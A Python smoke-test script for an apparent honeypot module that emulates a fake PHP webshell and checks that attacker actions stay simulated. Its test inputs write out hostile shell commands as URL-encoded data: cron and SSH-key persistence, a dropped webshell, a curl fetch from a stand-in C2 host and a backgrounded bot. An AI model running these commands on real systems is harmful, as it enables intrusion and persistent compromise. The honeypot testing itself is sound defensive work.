"""Local smoke for ANGLERFISH_PHP2SHELL_FAKE_PERSIST overlay (no network)."""
from __future__ import print_function

import os
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from anglerfish import php2shell_chain as c


def check(name, cond, detail=""):
    if cond:
        print("  OK", name)
        return 0
    print("  FAIL", name, detail)
    return 1


def _body(r):
    if not r:
        return b""
    b = r[0]
    return b if isinstance(b, bytes) else b.encode()


def _gate_sid(sid="SIDFP1aaaaaaaaaa"):
    """Mint S1+S2 so fake-shell gate is open."""
    c.note_s1(sid, progress_name="FPMARK", body_prefix=b"FPMARK",
              declared_length=100)
    os.environ["ANGLERFISH_PHP2SHELL_NO_FLAKE"] = "1"
    c.route("/session_upload_progress.php", method="GET", sessid=sid, p2s={})
    return sid


def _cmd(sid, query):
    return c.route("/uploads/shell.php", method="GET", query=query,
                   sessid=sid, p2s={})


def main():
    failures = 0
    sample_root = tempfile.mkdtemp(prefix="p2s-fp-")
    os.environ["ANGLERFISH_PHP2SHELL_FULLCHAIN"] = "1"
    os.environ["ANGLERFISH_PHP2SHELL_OOM_SHAPE"] = "0"
    os.environ["ANGLERFISH_PHP2SHELL_NO_FLAKE"] = "1"
    os.environ["ANGLERFISH_PHP2SHELL_FAKE_LEAK"] = "0"
    os.environ["ANGLERFISH_PHP2SHELL_SAMPLE_DIR"] = sample_root

    # --- Flag OFF: crontab -l must NOT sticky (legacy unknown/empty) ---
    c.reset_state_for_tests()
    os.environ.pop("ANGLERFISH_PHP2SHELL_FAKE_PERSIST", None)
    failures += check("flag_default_off", not c.fake_persist_enabled())
    sid0 = _gate_sid("SIDFPOFFaaaaaaaa")
    r_off_w = _cmd(sid0, "cmd=echo+%27*+*+*+*+*+/tmp/bot%27+%7C+crontab+-")
    r_off_l = _cmd(sid0, "cmd=crontab+-l")
    b_off_l = _body(r_off_l)
    # Without flag: no sticky crontab text from prior write
    sticky_off = b"* * * * * /tmp/bot" in b_off_l or b"*+*+*+*+*" in b_off_l
    failures += check(
        "flag_off_crontab_not_sticky",
        r_off_l and r_off_l[4] == "fake_shell" and not sticky_off,
        repr(b_off_l[:120]))

    # --- Flag ON ---
    c.reset_state_for_tests()
    os.environ["ANGLERFISH_PHP2SHELL_FAKE_PERSIST"] = "1"
    failures += check("flag_on", c.fake_persist_enabled())
    sid = _gate_sid("SIDFPON1aaaaaaaa")

    # A) crontab write then -l sticky
    r_cw = _cmd(sid, "cmd=echo+%27*+*+*+*+*+/tmp/bot%27+%7C+crontab+-")
    meta_cw = (r_cw[6] or {}) if r_cw else {}
    failures += check(
        "crontab_write_quiet",
        r_cw and r_cw[4] == "fake_shell"
        and meta_cw.get("fake_shell_persist") == "cron"
        and meta_cw.get("bait_fake_persist"),
        str(meta_cw))
    r_cl = _cmd(sid, "cmd=crontab+-l")
    b_cl = _body(r_cl)
    failures += check(
        "crontab_list_sticky",
        r_cl and b"/tmp/bot" in b_cl and b"*" in b_cl,
        repr(b_cl[:160]))

    # A) authorized_keys write then cat sticky
    r_ak = _cmd(
        sid,
        "cmd=echo+%27ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABgQC0+probe%27+"
        "%3E%3E+%2Fvar%2Fwww%2F.ssh%2Fauthorized_keys")
    meta_ak = (r_ak[6] or {}) if r_ak else {}
    failures += check(
        "ssh_keys_write",
        r_ak and meta_ak.get("fake_shell_persist") == "ssh_keys"
        and meta_ak.get("bait_fake_persist"),
        str(meta_ak))
    r_akc = _cmd(sid, "cmd=cat+%2Fvar%2Fwww%2F.ssh%2Fauthorized_keys")
    b_akc = _body(r_akc)
    failures += check(
        "ssh_keys_cat_sticky",
        r_akc and b"ssh-rsa" in b_akc and b"AAAAB3NzaC1yc2E" in b_akc,
        repr(b_akc[:160]))

    # A) php webshell write then ls shows it
    r_ws = _cmd(sid, "cmd=echo+x+%3E+%2Fuploads%2Fdrop.php")
    meta_ws = (r_ws[6] or {}) if r_ws else {}
    failures += check(
        "webshell_write",
        r_ws and (meta_ws.get("fake_shell_persist") == "webshell"
                  or meta_ws.get("fake_shell_write_claimed")),
        str(meta_ws))
    r_ls = _cmd(sid, "cmd=ls+%2Fuploads")
    b_ls = _body(r_ls)
    failures += check(
        "webshell_ls_sticky",
        r_ls and b"drop.php" in b_ls,
        repr(b_ls[:200]))

    # B/C) curl sets fetch_url + c2 peer; ss shows ESTABLISHED
    r_cu = _cmd(sid, "cmd=curl+http%3A%2F%2Fc2.evil.test%3A8080%2Fx.sh")
    meta_cu = (r_cu[6] or {}) if r_cu else {}
    failures += check(
        "curl_sets_fetch_and_c2",
        r_cu and meta_cu.get("fake_shell_fetch_url")
        and meta_cu.get("bait_fake_c2"),
        str(meta_cu))
    r_ss = _cmd(sid, "cmd=ss+-tunap")
    b_ss = _body(r_ss)
    meta_ss = (r_ss[6] or {}) if r_ss else {}
    failures += check(
        "ss_established_to_c2",
        r_ss and meta_ss.get("bait_fake_c2")
        and b"ESTAB" in b_ss.upper()
        and b"c2.evil.test:8080" in b_ss,
        repr(b_ss[:240]))
    r_ns = _cmd(sid, "cmd=netstat+-antp")
    b_ns = _body(r_ns)
    failures += check(
        "netstat_established_to_c2",
        r_ns and b"c2.evil.test:8080" in b_ns,
        repr(b_ns[:240]))

    # C) chmod + nohup ./bot quiet; ps shows decoy
    r_ch = _cmd(sid, "cmd=chmod+%2Bx+%2Ftmp%2Fbot")
    failures += check(
        "chmod_quiet",
        r_ch and r_ch[4] == "fake_shell"
        and (r_ch[6] or {}).get("fake_shell_write_claimed"),
        str((r_ch[6] or {}) if r_ch else None))
    r_nh = _cmd(sid, "cmd=nohup+%2E%2Fbot+%26")
    meta_nh = (r_nh[6] or {}) if r_nh else {}
    failures += check(
        "nohup_bot_claimed",
        r_nh and meta_nh.get("fake_shell_exec_claimed")
        and meta_nh.get("bait_fake_c2")
        and meta_nh.get("fake_shell_persist") == "proc",
        str(meta_nh))
    r_ps = _cmd(sid, "cmd=ps+aux")
    b_ps = _body(r_ps)
    failures += check(
        "ps_shows_decoy_bot",
        r_ps and b"www-data" in b_ps and (b"./bot" in b_ps or b"bot" in b_ps),
        repr(b_ps[-200:]))

    # Hard-stop sanity: still no real FS write of attacker body to cwd
    probe = "/tmp/anglerfish-fake-persist-probe-%s" % os.getpid()
    if os.path.exists(probe):
        os.remove(probe)
    _cmd(sid, "cmd=echo+pwned+%3E+" + probe.replace("/", "%2F"))
    failures += check(
        "hardstop_no_real_fs_write",
        not os.path.exists(probe),
        "probe appeared on disk")

    # Peer parse helper
    failures += check(
        "peer_from_url_http",
        c._peer_from_url("http://evil.test/x") == "evil.test:80")
    failures += check(
        "peer_from_url_https_port",
        c._peer_from_url("https://evil.test:8443/a") == "evil.test:8443")

    print()
    if failures:
        print("%d FAILURES" % failures)
        return 1
    print("all php2shell_fake_persist checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
